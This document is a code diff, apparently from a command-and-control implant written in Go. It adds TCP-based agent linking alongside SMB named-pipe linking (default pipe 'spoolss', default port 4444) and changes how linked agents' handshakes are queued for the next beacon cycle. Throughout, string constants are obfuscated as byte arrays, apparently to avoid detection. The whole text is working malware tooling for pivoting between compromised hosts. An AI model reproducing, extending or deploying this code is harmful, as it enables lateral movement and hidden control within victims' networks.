@@ -14,10 +14,13 @@ var (
 	lnkCmdUnlink    = string([]byte{0x75, 0x6e, 0x6c, 0x69, 0x6e, 0x6b})                                     // unlink
 	lnkCmdLinks     = string([]byte{0x6c, 0x69, 0x6e, 0x6b, 0x73})                                           // links
 	lnkProtoSmb     = string([]byte{0x73, 0x6d, 0x62})                                                       // smb
+	lnkProtoTcp     = string([]byte{0x74, 0x63, 0x70})                                                       // tcp
 	lnkDefPipe      = string([]byte{0x73, 0x70, 0x6f, 0x6f, 0x6c, 0x73, 0x73})                               // spoolss
+	lnkDefPort      = string([]byte{0x34, 0x34, 0x34, 0x34})                                                 // 4444
 	lnkLocalhost    = string([]byte{0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74})                   // localhost
 	lnkLoopback     = string([]byte{0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31})                   // 127.0.0.1
 	lnkDot          = string([]byte{0x2e})                                                                   // .
+	lnkColon        = string([]byte{0x3a})                                                                   // :
 	lnkUncPrefix    = string([]byte{0x5c, 0x5c})                                                             // \\
 	lnkPipePath     = string([]byte{0x5c, 0x70, 0x69, 0x70, 0x65, 0x5c})                                     // \pipe\
 	lnkOutPrefix    = string([]byte{0x53, 0x36, 0x7c})                                                       // S6|
@@ -57,6 +60,16 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 		pipePath := lnkUncPrefix + targetHost + lnkPipePath + pipeName
 		return c.linkSMB(pipePath)
 
+	case lnkProtoTcp:
+		port := lnkDefPort
+		if len(args) >= 3 {
+			port = args[2]
+		}
+
+		// Build the TCP address (host:port)
+		address := targetHost + lnkColon + port
+		return c.linkTCP(address)
+
 	default:
 		return CommandResult{
 			Output:      ErrCtx(E29, protocol),
@@ -91,34 +104,52 @@ func (c *LinkCommand) linkSMB(pipePath string) CommandResult {
 	}
 }
 
+func (c *LinkCommand) linkTCP(address string) CommandResult {
+	// Get the link manager
+	lm := GetLinkManager()
+
+	// Attempt to link via TCP
+	routingID, err := lm.LinkTCP(address)
+	if err != nil {
+		return CommandResult{
+			Output:      ErrCtx(E30, address),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
+	// Perform immediate handshake round-trip
+	// This avoids waiting for the next poll cycle
+	handshakeResult := performImmediateHandshake(lm, routingID)
+
+	return CommandResult{
+		Output:      lnkOutPrefix + address + lnkPipe + routingID + lnkPipe + handshakeResult,
+		ExitCode:    0,
+		CompletedAt: time.Now().Format(time.RFC3339),
+	}
+}
+
 // performImmediateHandshake handles the full handshake round-trip immediately
 // instead of waiting for the next poll cycle
 func performImmediateHandshake(lm *LinkManager, routingID string) string {
 	// log.Printf("[LinkCommand] Starting immediate handshake for routing_id %s", routingID)
 
-	// Wait briefly for the SMB agent's handshake to arrive in the outbound queue
+	// Wait briefly for the SMB/TCP agent's handshake to arrive in the handshake queue
 	// The handleIncomingData goroutine should receive it shortly after connection
 	const handshakeWaitTimeout = 5 * time.Second
 	deadline := time.Now().Add(handshakeWaitTimeout)
 
 	var handshakeData *LinkDataOut
 	for time.Now().Before(deadline) {
-		// Check outbound queue for handshake data
-		data := lm.GetOutboundData()
-		for _, item := range data {
-			if item.RoutingID == routingID {
-				handshakeData = item
-				break
-			}
-		}
-		if handshakeData != nil {
+		// Check handshake queue for handshake data (sent via "lh" field)
+		data := lm.GetHandshakeData()
+		if data != nil && data.RoutingID == routingID {
+			handshakeData = data
 			break
 		}
-		// Re-queue any data that wasn't for us
-		for _, item := range data {
-			if item.RoutingID != routingID {
-				lm.queueOutboundData(item)
-			}
+		// Re-queue any handshake that wasn't for us
+		if data != nil {
+			lm.queueHandshakeData(data)
 		}
 		time.Sleep(100 * time.Millisecond)
 	}
@@ -127,8 +158,8 @@ func performImmediateHandshake(lm *LinkManager, routingID string) string {
 		return lnkPending
 	}
 
-	// Queue the handshake data to be sent on the next POST cycle
-	lm.queueOutboundData(handshakeData)
+	// Queue the handshake data to be sent via "lh" field on next POST cycle
+	lm.queueHandshakeData(handshakeData)
 	return lnkQueued
 }
 
